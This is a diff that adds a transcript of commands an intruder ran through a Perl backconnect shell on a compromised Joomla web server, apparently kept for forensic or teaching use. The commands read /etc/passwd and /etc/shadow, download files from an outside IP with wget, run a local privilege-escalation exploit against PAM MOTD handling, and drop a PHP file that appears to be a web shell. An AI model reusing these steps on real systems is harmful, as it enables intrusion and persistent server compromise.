@@ -1,0 +1,258 @@
+# Transcript of commands executed by the attacker via the Perl backconnect shell
+# Attacker commands are prefixed by >> 
+
+>> ls
+
+articles.jpg
+clock.jpg
+ext_com.png
+ext_lang.png
+ext_mod.png
+ext_plugin.png
+food
+fruit
+index.html
+joomla-dev_cycle.png
+key.jpg
+ogfcmxaiaexofkdozkvz.php
+pastarchives.jpg
+powered_by.png
+taking_notes.jpg
+web_links.jpg
+
+
+>> pwd
+
+/var/www/images/stories
+
+
+>> hostname
+
+web002
+
+
+>> id
+
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+
+
+>> cat /etc/passwd
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+syslog:x:101:103::/home/syslog:/bin/false
+mysql:x:102:105:MySQL Server,,,:/var/lib/mysql:/bin/false
+landscape:x:103:106::/var/lib/landscape:/bin/false
+sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
+webadmin:x:1000:1000:webadmin,,,:/home/webadmin:/bin/bash
+
+
+>> cp /etc/passwd .
+
+
+>> ls
+
+articles.jpg
+clock.jpg
+ext_com.png
+ext_lang.png
+ext_mod.png
+ext_plugin.png
+food
+fruit
+index.html
+joomla-dev_cycle.png
+key.jpg
+ogfcmxaiaexofkdozkvz.php
+passwd
+pastarchives.jpg
+powered_by.png
+taking_notes.jpg
+web_links.jpg
+
+
+>> cat /etc/shadow
+
+
+>> ls
+
+articles.jpg
+clock.jpg
+ext_com.png
+ext_lang.png
+ext_mod.png
+ext_plugin.png
+food
+fruit
+index.html
+joomla-dev_cycle.png
+key.jpg
+ogfcmxaiaexofkdozkvz.php
+passwd
+pastarchives.jpg
+powered_by.png
+taking_notes.jpg
+web_links.jpg
+
+
+>> cat /etc/hosts
+
+127.0.0.1	localhost
+127.0.1.1	web002
+
+# The following lines are desirable for IPv6 capable hosts
+::1     localhost ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
+ff00::0 ip6-mcastprefix
+ff02::1 ip6-allnodes
+ff02::2 ip6-allrouters
+ff02::3 ip6-allhosts
+
+
+>> df -k
+
+Filesystem           1K-blocks      Used Available Use% Mounted on
+/dev/sda1              3889892    726252   2966044  20% /
+udev                    254652       144    254508   1% /dev
+none                    254652         0    254652   0% /dev/shm
+none                    254652        40    254612   1% /var/run
+none                    254652         0    254652   0% /var/lock
+none                    254652         0    254652   0% /lib/init/rw
+
+
+>> wget 58.64.132.100/timeserver.bash
+
+
+>> ls
+
+articles.jpg
+clock.jpg
+ext_com.png
+ext_lang.png
+ext_mod.png
+ext_plugin.png
+food
+fruit
+index.html
+joomla-dev_cycle.png
+key.jpg
+ogfcmxaiaexofkdozkvz.php
+passwd
+pastarchives.jpg
+powered_by.png
+taking_notes.jpg
+timeserver.bash
+web_links.jpg
+
+
+>> ./timeserver.bash /etc/passwd
+
+
+>> ls -la
+
+total 112
+drwxr-xr-x 4 www-data www-data  4096 Feb  8 18:36 .
+drwxr-xr-x 6 www-data www-data  4096 Feb  7 21:03 ..
+-rw-r--r-- 1 www-data www-data  4569 Feb  7 21:03 articles.jpg
+-rw-r--r-- 1 www-data www-data  4995 Feb  7 21:03 clock.jpg
+-rw-r--r-- 1 www-data www-data   251 Feb  7 21:03 ext_com.png
+-rw-r--r-- 1 www-data www-data   215 Feb  7 21:03 ext_lang.png
+-rw-r--r-- 1 www-data www-data   244 Feb  7 21:03 ext_mod.png
+-rw-r--r-- 1 www-data www-data   261 Feb  7 21:03 ext_plugin.png
+drwxr-xr-x 2 www-data www-data  4096 Feb  7 21:03 food
+drwxr-xr-x 2 www-data www-data  4096 Feb  7 21:03 fruit
+-rw-r--r-- 1 www-data www-data    47 Feb  7 21:03 index.html
+-rw-r--r-- 1 www-data www-data 18017 Feb  7 21:03 joomla-dev_cycle.png
+-rw-r--r-- 1 www-data www-data  2665 Feb  7 21:03 key.jpg
+-rw-r--r-- 1 www-data www-data  1715 Feb  8 18:33 ogfcmxaiaexofkdozkvz.php
+-rw-r--r-- 1 www-data www-data  1020 Feb  8 18:34 passwd
+-rw-r--r-- 1 www-data www-data  5446 Feb  7 21:03 pastarchives.jpg
+-rw-r--r-- 1 www-data www-data  2560 Feb  7 21:03 powered_by.png
+-rw-r--r-- 1 www-data www-data  3273 Feb  7 21:03 taking_notes.jpg
+-rw-r--r-- 1 www-data www-data   428 Feb  6 15:52 timeserver.bash
+-rw-r--r-- 1 www-data www-data  5783 Feb  7 21:03 web_links.jpg
+
+
+>> chmod 755 timeserver.bash
+
+
+>> ./timeserver.bash /etc/passwd
+
+\n@@@ File before tampering ...\n
+-rw-r--r-- 1 root root 1020 Feb  7 20:56 /etc/passwd
+\n@@@ Now log back into your shell (or re-ssh) to make PAM call vulnerable MOTD code :)  File will then be owned by your user.  Try /etc/passwd...\n
+
+
+>> ls -la /etc/passwd
+
+-rw-r--r-- 1 root root 1020 Feb  7 20:56 /etc/passwd
+
+
+>> wget 58.64.132.100/webstats.txt
+
+
+>> ls
+
+articles.jpg
+clock.jpg
+ext_com.png
+ext_lang.png
+ext_mod.png
+ext_plugin.png
+food
+fruit
+index.html
+joomla-dev_cycle.png
+key.jpg
+ogfcmxaiaexofkdozkvz.php
+passwd
+pastarchives.jpg
+powered_by.png
+taking_notes.jpg
+timeserver.bash
+web_links.jpg
+webstats.txt
+
+
+>> cp webstats.txt webstats.php
+
+
+>> ls
+
+articles.jpg
+clock.jpg
+ext_com.png
+ext_lang.png
+ext_mod.png
+ext_plugin.png
+food
+fruit
+index.html
+joomla-dev_cycle.png
+key.jpg
+ogfcmxaiaexofkdozkvz.php
+passwd
+pastarchives.jpg
+powered_by.png
+taking_notes.jpg
+timeserver.bash
+web_links.jpg
+webstats.php
+webstats.txt
